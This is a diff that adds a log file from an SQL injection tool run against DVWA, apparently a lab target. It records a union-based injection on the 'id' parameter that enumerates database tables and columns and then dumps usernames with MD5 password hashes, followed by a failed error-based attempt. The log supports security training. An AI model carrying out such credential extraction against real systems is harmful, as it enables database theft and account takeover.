@@ -1,0 +1,309 @@
+--- Looking for SQLi vulnerabilities ---
+
+
+Found SQL vulnerability in parameter: id=1
+
+--- STARTING UNION-BASED SQLI ---
+
+
+
+--- TESTING PARAMETER "id=1" ---
+
+
+
+Number of columns in SELECT statement of parameter "id=1": 2
+
+
+Column no. 1 seems to contain readable data... EXTRACTING TABLES
+
+Database name: dvwa
+
+Extracted tables from dvwa database:
+
+
+	CHARACTER_SETS
+	COLLATIONS
+	COLLATION_CHARACTER_SET_APPLICABILITY
+	COLUMNS
+	COLUMN_PRIVILEGES
+	KEY_COLUMN_USAGE
+	PROFILING
+	ROUTINES
+	SCHEMATA
+	SCHEMA_PRIVILEGES
+	STATISTICS
+	TABLES
+	TABLE_CONSTRAINTS
+	TABLE_PRIVILEGES
+	TRIGGERS
+	USER_PRIVILEGES
+	VIEWS
+	guestbook
+	users
+	columns_priv
+	db
+	func
+	help_category
+	help_keyword
+	help_relation
+	help_topic
+	host
+	proc
+	procs_priv
+	tables_priv
+	time_zone
+	time_zone_leap_second
+	time_zone_name
+	time_zone_transition
+	time_zone_transition_type
+	user
+	accounts
+	blogs_table
+	captured_data
+	credit_cards
+	hitlog
+	pen_test_tools
+	galaxia_activities
+	galaxia_activity_roles
+	galaxia_instance_activities
+	galaxia_instance_comments
+	galaxia_instances
+	galaxia_processes
+	galaxia_roles
+	galaxia_transitions
+	galaxia_user_roles
+	galaxia_workitems
+	messu_archive
+	messu_messages
+	messu_sent
+	sessions
+	tiki_actionlog
+	tiki_article_types
+	tiki_articles
+	tiki_banners
+	tiki_banning
+	tiki_banning_sections
+	tiki_blog_activity
+	tiki_blog_posts
+	tiki_blog_posts_images
+	tiki_blogs
+	tiki_calendar_categories
+	tiki_calendar_items
+	tiki_calendar_locations
+	tiki_calendar_roles
+	tiki_calendars
+	tiki_categories
+	tiki_categorized_objects
+	tiki_category_objects
+	tiki_category_sites
+	tiki_chart_items
+	tiki_charts
+	tiki_charts_rankings
+	tiki_charts_votes
+	tiki_chat_channels
+	tiki_chat_messages
+	tiki_chat_users
+	tiki_comments
+	tiki_content
+	tiki_content_templates
+	tiki_content_templates_sections
+	tiki_cookies
+	tiki_copyrights
+	tiki_directory_categories
+	tiki_directory_search
+	tiki_directory_sites
+	tiki_download
+	tiki_drawings
+	tiki_dsn
+	tiki_dynamic_variables
+	tiki_eph
+	tiki_extwiki
+	tiki_faq_questions
+	tiki_faqs
+	tiki_featured_links
+	tiki_file_galleries
+	tiki_file_handlers
+	tiki_files
+	tiki_forum_attachments
+	tiki_forum_reads
+	tiki_forums
+	tiki_forums_queue
+	tiki_forums_reported
+	tiki_friends
+	tiki_friendship_requests
+	tiki_galleries
+	tiki_galleries_scales
+	tiki_games
+	tiki_group_inclusion
+	tiki_history
+	tiki_hotwords
+	tiki_html_pages
+	tiki_html_pages_dynamic_zones
+	tiki_images
+	tiki_images_data
+	tiki_integrator_reps
+	tiki_integrator_rules
+	tiki_language
+	tiki_languages
+	tiki_link_cache
+	tiki_links
+	tiki_live_support_events
+	tiki_live_support_message_comments
+	tiki_live_support_messages
+	tiki_live_support_modules
+	tiki_live_support_operators
+	tiki_live_support_requests
+	tiki_logs
+	tiki_mail_events
+	tiki_mailin_accounts
+	tiki_menu_languages
+	tiki_menu_options
+	tiki_menus
+	tiki_minical_events
+	tiki_minical_topics
+	tiki_modules
+	tiki_newsletter_groups
+	tiki_newsletter_subscriptions
+	tiki_newsletters
+	tiki_newsreader_marks
+	tiki_newsreader_servers
+	tiki_object_ratings
+	tiki_page_footnotes
+	tiki_pages
+	tiki_pageviews
+	tiki_poll_objects
+	tiki_poll_options
+	tiki_polls
+	tiki_preferences
+	tiki_private_messages
+	tiki_programmed_content
+	tiki_quicktags
+	tiki_quiz_question_options
+	tiki_quiz_questions
+	tiki_quiz_results
+	tiki_quiz_stats
+	tiki_quiz_stats_sum
+	tiki_quizzes
+	tiki_received_articles
+	tiki_received_pages
+	tiki_referer_stats
+	tiki_related_categories
+	tiki_rss_feeds
+	tiki_rss_modules
+	tiki_score
+	tiki_search_stats
+	tiki_searchindex
+	tiki_searchsyllable
+	tiki_searchwords
+	tiki_secdb
+	tiki_semaphores
+	tiki_sent_newsletters
+	tiki_sessions
+	tiki_sheet_layout
+	tiki_sheet_values
+	tiki_sheets
+	tiki_shoutbox
+	tiki_shoutbox_words
+	tiki_stats
+	tiki_structure_versions
+	tiki_structures
+	tiki_submissions
+	tiki_suggested_faq_questions
+	tiki_survey_question_options
+	tiki_survey_questions
+	tiki_surveys
+	tiki_tags
+	tiki_theme_control_categs
+	tiki_theme_control_objects
+	tiki_theme_control_sections
+	tiki_topics
+	tiki_tracker_fields
+	tiki_tracker_item_attachments
+	tiki_tracker_item_comments
+	tiki_tracker_item_fields
+	tiki_tracker_items
+	tiki_tracker_options
+	tiki_trackers
+	tiki_translated_objects
+	tiki_untranslated
+	tiki_user_answers
+	tiki_user_answers_uploads
+	tiki_user_assigned_modules
+	tiki_user_bookmarks_folders
+	tiki_user_bookmarks_urls
+	tiki_user_mail_accounts
+	tiki_user_menus
+	tiki_user_modules
+	tiki_user_notes
+	tiki_user_postings
+	tiki_user_preferences
+	tiki_user_quizzes
+	tiki_user_taken_quizzes
+	tiki_user_tasks
+	tiki_user_tasks_history
+	tiki_user_votings
+	tiki_user_watches
+	tiki_userfiles
+	tiki_userpoints
+	tiki_users
+	tiki_users_score
+	tiki_webmail_contacts
+	tiki_webmail_messages
+	tiki_wiki_attachments
+	tiki_zones
+	users_grouppermissions
+	users_groups
+	users_objectpermissions
+	users_permissions
+	users_usergroups
+	users_users
+
+Found 10 tables containing word "users":
+
+
+	---  "users"  ---
+	---  "tiki_chat_users"  ---
+	---  "tiki_users"  ---
+	---  "tiki_users_score"  ---
+	---  "users_grouppermissions"  ---
+	---  "users_groups"  ---
+	---  "users_objectpermissions"  ---
+	---  "users_permissions"  ---
+	---  "users_usergroups"  ---
+	---  "users_users"  ---
+
+
+Extracted columns from users.dvwa table:
+
+	user_id
+	first_name
+	last_name
+	user
+	password
+	avatar
+
+Found 3 columns in users.dvwa, which possibly contain confidential data:
+
+	---  "user_id"  ---
+	---  "user"  ---
+	---  "password"  ---
+
+EXTRACTING USERNAMES AND PASSWORDS
+
+Username: admin    Password: 5f4dcc3b5aa765d61d8327deb882cf99
+Username: gordonb    Password: e99a18c428cb38d5f260853678922e03
+Username: 1337    Password: 8d3533d75ae2c3966d7e0d4fcc69216b
+Username: pablo    Password: 0d107d09f5bbe40cade3de5c71e9e9b7
+Username: smithy    Password: 5f4dcc3b5aa765d61d8327deb882cf99
+
+--- STARTING ERROR-BASED SQLI ---
+
+
+
+--- TESTING PARAMETER "id=1" ---
+
+
+
+URL Not Vulnerable to Error-Based SQLi, probably due to limited error messages
+
+
